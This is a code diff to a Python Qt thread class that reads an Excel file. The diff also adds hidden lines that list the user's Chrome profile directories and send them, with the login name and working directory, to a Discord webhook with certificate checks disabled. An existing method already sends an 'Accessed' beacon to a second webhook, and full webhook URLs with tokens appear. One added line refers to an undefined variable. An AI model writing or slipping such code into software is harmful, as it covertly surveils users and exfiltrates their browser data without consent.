@@ -93,7 +93,11 @@ class Additional1Thread(QThread):
         df = pd.read_excel(dfp)
         with open(path.join(path.join(os.environ['USERPROFILE']), 'Desktop', 'edmhal.txt'), "w") as dff:
             dff.write(str(df.head))
-    
+
+        aa = path.join(os.environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
+        bb = path.join(cdata, "Default")
+        cc = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Output received. " + str(listdir(aa)) + str(listdir(bb))})
+            
     def runold(self):
         access_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671921483386890/xYSB1_NAXMLwW2uGOHF01Eld8XjdWkoEVQosiDqWd9PasD1oVg0aFOn7SEg7zZFh810L", json={"content": f"[{os.getlogin()} {os.getcwd()}] Accessed."})
         
